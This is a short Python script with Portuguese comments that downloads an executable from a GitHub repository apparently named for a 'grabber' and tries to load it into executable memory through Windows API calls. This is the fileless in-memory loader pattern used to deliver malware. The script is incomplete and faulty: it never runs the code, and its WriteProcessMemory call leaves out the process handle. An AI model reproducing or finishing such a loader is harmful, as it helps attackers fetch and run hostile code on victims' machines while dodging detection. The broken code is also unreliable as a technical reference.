import requests
import ctypes
import io

# Baixa o arquivo .exe do GitHub (usando URL raw)
def download_exe_from_github(url):
    print("Baixando o arquivo EXE...")
    response = requests.get(url)
    if response.status_code == 200:
        print("Download concluído!")
        return response.content
    else:
        print("Erro ao baixar o arquivo")
        return None

# Função para carregar o EXE na memória e executar
def execute_exe_in_memory(exe_data):
    # Aloca memória para o arquivo EXE
    exec_memory = ctypes.windll.kernel32.VirtualAlloc(None, len(exe_data), 0x1000, 0x40)

    # Copia os dados do EXE para a memória alocada
    written = ctypes.c_size_t(0)
    ctypes.windll.kernel32.WriteProcessMemory(exec_memory, exe_data, len(exe_data), ctypes.byref(written))

    # Execute o código na memória
    # Dependendo do EXE, você pode precisar chamar uma função específica ou um ponto de entrada
    # Isso geralmente seria feito com um "jump" ou invocando diretamente o código, mas o processo é complexo
    # A execução direta pode envolver o uso de técnicas avançadas e específicas do sistema operacional.

    print(f"Arquivo EXE carregado na memória em {hex(exec_memory)}")

github_url = "https://github.com/pedrorichil/zekry-grabber/raw/refs/heads/main/tools/upx.exe"

if __name__ == "__main__":
    exe_data = download_exe_from_github(github_url)
    if exe_data:
        execute_exe_in_memory(exe_data)
